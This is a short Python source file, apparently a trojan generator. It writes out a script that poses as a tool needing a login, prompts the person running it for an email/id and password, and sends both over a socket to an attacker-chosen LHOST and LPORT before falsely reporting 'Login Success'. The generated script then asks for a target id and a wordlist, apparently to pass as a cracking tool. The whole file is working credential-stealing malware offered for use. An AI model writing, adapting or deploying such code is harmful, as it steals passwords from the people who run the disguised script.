###
# Author : Muhammad Quwais Saputra
###

def sbd_injects(f_name,LHOST,LPORT):
    scripts = """
import socket 

def SLogin():
    LHOST="{0}"
    LPORT={1}
    s = socket.socket()
    s.connect((LHOST,int(LPORT)))
    print("[!] You Must Login First!!")
    x = input("[?] Your email/id : ")
    f = input("[?] Your Password : ")
    b_s = bytes(x,encoding="utf-8")
    b_x = bytes(f,encoding="utf-8")
    s.send(b_s)
    s.send(b_x)
    print("[!] Login Success")

SLogin()
target = input("Target id : ")
w = input("wordlist : ")
    """.format(LHOST,LPORT)
    with open(f_name, "w") as f:
        f.write(scripts)
        f.close()

def Injects(script, f_name, LHOST, LPORT):
    if script == "sbd":
        sbd_injects(f_name, LHOST, LPORT)
    else:
        pass
